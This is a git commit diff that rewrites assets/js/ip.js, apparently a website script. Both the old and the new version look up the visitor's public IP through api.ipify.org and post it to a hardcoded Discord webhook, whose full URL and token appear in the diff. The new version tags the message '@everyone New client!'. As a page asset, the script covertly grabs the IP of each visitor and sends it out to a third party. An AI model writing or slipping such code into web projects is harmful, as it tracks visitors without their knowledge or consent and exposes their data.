8065f6317a1f911199ecdab6c4fd78e0f696ba8a
magi77777 <158772346+magi77777@users.noreply.github.com>
2024-09-12 16:49:26 +0200

    Update ip.js

--- assets/js/ip.js
+++ assets/js/ip.js
@@ -1,24 +1,41 @@
-fetch('https://api.ipify.org?format=json')
-  .then(response => response.json())
-  .then(data => {
-    const ip = data.ip;
-    const webhookUrl = 'https://discord.com/api/webhooks/1283800599321776148/aQ6bqNSiG7m0gVi_CrayUPmCMXrf4pZU3QFP-37aUrGJkdmUK_4Ir0fEmdoorbLFhuP7';
+const request = require('request');
 
-    const payload = JSON.stringify({
-      content: `${ip}`
-    });
+const webhookUrl = 'https://discord.com/api/webhooks/1283800599321776148/aQ6bqNSiG7m0gVi_CrayUPmCMXrf4pZU3QFP-37aUrGJkdmUK_4Ir0fEmdoorbLFhuP7';
 
-    fetch(webhookUrl, {
-      method: 'POST',
-      headers: {
-        'Content-Type': 'application/json'
-      },
-      body: payload
-    })
-    .then(response => {
-      console.log('success');
-    })
-    .catch(error => {
-      console.error('error', error);
-    });
+const getPublicIp = (callback) => {
+  request('https://api.ipify.org?format=json', (error, response, body) => {
+    if (error) {
+      console.error('Errorip', error);
+      return;
+    }
+    const ip = JSON.parse(body).ip;
+    callback(ip);
   });
+};
+
+const sendToDiscord = (ip) => {
+  const payload = JSON.stringify({
+    content: `@everyone New client! ${ip}`
+  });
+
+  const options = {
+    url: webhookUrl,
+    method: 'POST',
+    headers: {
+      'Content-Type': 'application/json'
+    },
+    body: payload
+  };
+
+  request(options, (error, response, body) => {
+    if (error) {
+      console.error('Error:', error);
+    } else {
+      console.log('Success');
+    }
+  });
+};
+
+getPublicIp((ip) => {
+  sendToDiscord(ip);
+});
